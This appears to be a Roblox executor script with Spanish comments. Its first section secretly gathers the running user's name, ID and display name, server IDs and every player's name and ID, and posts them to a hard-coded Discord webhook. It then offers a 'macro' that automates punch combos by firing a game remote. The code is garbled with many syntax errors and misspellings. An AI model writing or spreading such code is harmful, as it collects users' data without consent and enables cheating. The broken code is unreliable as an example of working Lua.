-- =========================================================
-- PROYECT
-- =========================================================

local Players = game:GetService("Players")
local HttpService = game:GetService("httpService")
local LocalPlayer = Players.LocalPlayer

-- =========================================================
-- URL CONFI
-- =========================================================

local WEBHOOK_URL ="https://discord.com/api/webhooks/1558309695414997032/M0vCYSwYizXDDFvuzkJo_hPWXhGhOZxHTCOKZ47tjbai7xLqNd5dtWBgukHKe6WyNFUM"
local NEON GREEN = "00FF7F" --Verde neon

--==========================================================
--FEATURES
--==========================================================

local function getPlayerCount()
  return #Players:GetPlayers()
end

local function getAllUsernames()
  local usernames = ﹛﹜

  for _, player in ipairs(Players:GetPlayers()) do
   local playerData =player.Name .. " | ID: " .. player.UserId
     table.insert(usernames, playerData)
  end

  return usernames
end

local function formatUserList(UserTable)
  if  #UserTable == 0 then
    return "None"
  end 

  return table.concat(UserTable, "\n")
end

local function seendWebhook(payload)
  local request = syn and.request or http_request
  if not request then return end

  request(﹛
    Url = WEBHOOK URL,
    Method = "post",
    Headers = {
  ["Content-Type"] = "application/json
  })
end

--=========================================================
--EXECUTION SCRIPTS
--=========================================================

pcall(function()

    local playerCount =getplayerCount()
    local UserListTable = getAllUsernames()
    local formattedUser = formatUserList(UserListTable)

    local embedData =﹛

    ﹛
    ["name"] = "Executor Information",
    ["Value"] =
    "👤 Username: " .. LocalPlayer.Name .. "\n" ..
   "DisplayName: " .. LocalPlayer.DisplayName
    "UserId: " .. LocalPlayer.UserId
    ["inline"] = false
    },

{  
    ["Name"] = "Server Information",
    ["value"] =
    "PlaceId " .. tostring(game.PlaceId) .. "\n" ..
    "JobId: " .. game.JobId .. "\n" ..
    "PlayerCount: " .. tostring (PlayerCount),
    [inline = false
  },

{"name" = "Player In server",
["value"] = formattedUsers,
                ["inline"] = false
            },

            {
                ["name"] = "Execution Time",
                ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
                ["inline"] = false
            }
        },

        ["footer"] = {
            ["text"] = ".animius script"
        }
    }

    local payload = {
        ["content"] = "",
        ["embeds"] = { embedData }
    }

    sendWebhook(payload)

end)

--========================================================
--MACRO V2
--========================================================

ocal Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local events = ReplicatedStorage:WaitForChild("Events")
local punchRemote = events:WaitForChild("Punch")

-- Delays un poco más lentos y controlados
local hitDelays = {
	3.15,  -- combo 1
	3.99,  -- combo 2
	3.20,  -- combo 3
	4.00,  -- combo 4
	4.15   -- combo 5
}

local lastPunch = 0
local combo = 0
local lastComboTime = 0
local isPunching = false

local function doPunch(isCharged)
	local now = tick()
	
	if isPunching then return end
	
	if now - lastComboTime > 1.5 then
		combo = 0
	end
	
	local currentDelay = hitDelays[combo + 1] or 0.22
	
	if now - lastPunch < currentDelay then
		return
	end
	
	isPunching = true
	lastPunch = now
	lastComboTime = now
	
	combo = combo + 1
	if combo > 5 then
		combo = 1
	end
	
	local v4 = isCharged and 0.35 or 0
	local v5 = hitDelays[combo]
	
	punchRemote:FireServer(v4, v5, combo)
	
	task.delay(currentDelay * 0.9, function()
		isPunching = false
	end)
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		doPunch(false)
	end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == Enum.KeyCode.ButtonX then
		doPunch(true)
	end
end)

print("Working)
